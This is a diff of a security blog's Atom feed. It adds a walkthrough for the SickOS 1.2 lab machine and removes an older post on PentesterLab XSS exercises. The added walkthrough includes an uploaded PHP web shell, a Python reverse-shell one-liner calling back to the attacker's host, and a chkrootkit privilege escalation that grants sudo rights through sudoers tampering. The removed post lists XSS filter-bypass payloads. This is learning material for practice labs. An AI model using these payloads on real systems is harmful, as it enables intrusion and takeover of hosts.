@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-05-23T11:06:18-05:00</updated>
+  <updated>2016-06-02T14:24:55-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,132 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[vulhub-sickos1.2]]></title>
+    <link href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/"/>
+    <updated>2016-05-31T13:08:16-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2</id>
+    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Nikto</li>
+<li>Wfuzz</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>)</p>
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.180 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>
+
+<p>Looks like port 22 and port 80 are openning.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Check the <a href="http://192.168.79.180">http://192.168.79.180</a></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Not excited.</p>
+
+<p>use Nikto:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Still nothing cool</p>
+
+<p>try wfuzz:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.180/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p>find a test dir:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next exam the HTTP options:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl -v -X OPTIONS http://192.168.79.180/test/</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like it supports PUT.</p>
+
+<p>Now upload php reverse shell (I tried different ports, looks like only 443 port works):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p80 192.168.79.180 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php'</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now the shell is uploaded:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the reverse shell:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>A better php shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;exec&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Upload this shell, and in brower:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">http</span><span class="o">://</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">79.180</span><span class="o">/</span><span class="nx">test</span><span class="o">/</span><span class="nb">exec</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nb">exec</span><span class="o">=</span><span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.79.173&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>get the shell.</p>
+
+<p>During enumeration step, I follow (g0tmi1k)[]</p>
+
+<p><code>ls -l /etc/cron.daily</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>After enumeration, find the system has chkrootkit:</p>
+
+<p><code>dpkg -l | grep chkrootkit</code></p>
+
+<p>chkrootkit verions is 0.49 and it is vulnerable.</p>
+
+<p><code>searchsploit chkrootkit</code></p>
+
+<p><code>echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update</code></p>
+
+<p>also need to change the privilages on the update file with chmod 777 and wait:</p>
+
+<p><code>ls -al /etc/sudoers</code></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[sickos:1.1]]></title>
@@ -47,7 +173,7 @@
 
 <p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>Looks like port 22 and port 3218 are openning. the port 3218 is running Squid. open msfconsole, search squid. I found that:</p>
+<p>Looks like port 22 and port 3218 are openning. Port 3218 is running Squid. open msfconsole, search squid. I found that:</p>
 
 <p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
 
@@ -2153,301 +2279,6 @@ The web application will check the path extension and verify that it is a .png f
 <h4>reference</h4>
 
 <p><a href="https://www.fishnetsecurity.com/6labs/blog/common-web-application-vulnerabilities-part-6">Directory Traversal</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[PentesterLab -- Web for Pentester - XSS]]></title>
-    <link href="http://wg135.github.io/blog/2016/03/08/pentestlab-webforpentestr-xss/"/>
-    <updated>2016-03-08T13:55:55-06:00</updated>
-    <id>http://wg135.github.io/blog/2016/03/08/pentestlab-webforpentestr-xss</id>
-    <content type="html"><![CDATA[<p>Web for Pentester:
-    This exercise is a set of the most common web vulnerabilities</p>
-
-<p>Difficluty: 1/5</p>
-
-<!--more-->
-
-
-<h3>Example1</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;html&gt;</span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The vulnerability is due to no validaton of name.</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example1.php?name=&lt;script&gt;alert("xss")&lt;/script&gt;</code></p>
-
-<h3>Example2</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
-</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In the above code, the developer filter <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. However, I can use <code>&lt;Script&gt;alert('xss')&lt;/Script&gt;</code> to bypass it.</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example2.php?name=&lt;Script&gt;alert("xss")&lt;/Script&gt;</code></p>
-
-<h3>Example 3</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example3.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
-</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
-</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The developer tris to filter both lower case and upper case letter. I can use <code>recursion method</code> bypass this.</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert("xss")&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
-
-<h2>Example 4</h2>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example4.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/script/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'>
-</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">    </span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The developer tris to completely filter <code>script</code>. I can use <code>img</code> to bypass it.</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example4.php?name=&lt;img src="xx" onerror="alert('xss')"/&gt;</code></p>
-
-<h3>Example5</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example5.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/alert/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'>
-</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">    </span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The devekoper filter <code>alert</code>. I can use <code>fromCharCode</code> to build alert payload.</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></p>
-
-<h3>Example 6</h3>
-
-<p>code review:</p>
-
-<figure class='code'><figcaption><span>example6.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="x">&lt;script&gt;</span>
-</span><span class='line'><span class="x">  var $a= &quot;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
-</span><span class='line'><span class="x">&lt;/script&gt;</span>
-</span><span class='line'><span class="x">  </span><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The input name variable is between <code>&lt;script&gt;</code>, so we can just close the double quote and use <code>\\</code> to comment the reset of code.</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example6.php?name=";alert("xss");//
-</code></p>
-
-<h3>Example 7</h3>
-
-<p>code review</p>
-
-<figure class='code'><figcaption><span>example7.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello </span>
-</span><span class='line'><span class="x">&lt;script&gt;</span>
-</span><span class='line'><span class="x">  var $a= &#39;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
-</span><span class='line'><span class="x">&lt;/script&gt;</span>
-</span><span class='line'><span class="x">  </span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The developer uses <code>htmlentities()</code> to encode special characters. However, it does not encode single quotes <code>'</code>, so that I can use single quote to close it and comment the rest of the code</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example7.php?name=';alert('xss');//</code></p>
-
-<h3>Example 8</h3>
-
-<p>code review</p>
-
-<figure class='code'><figcaption><span>example8.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;HELLO &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
-</span><span class='line'><span class="x">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span>
-</span><span class='line'><span class="x">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The developer does not valid the parpmeter <code>PHP_SELF</code> so that I can bypass it.</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example8.php/" onmouseover="alert('xss')</code></p>
-
-<h3>Example 9</h3>
-
-<p>code review</p>
-
-<figure class='code'><figcaption><span>example9.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;script&gt;</span>
-</span><span class='line'><span class="x">  document.write(location.hash.substring(1));</span>
-</span><span class='line'><span class="x">&lt;/script&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The user input is after <code>#</code>. This is a DOM-based XSS vuln.</p>
-
-<p>exploit:</p>
-
-<p><code>http://192.168.79.162/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 ]]></content>
   </entry>
   
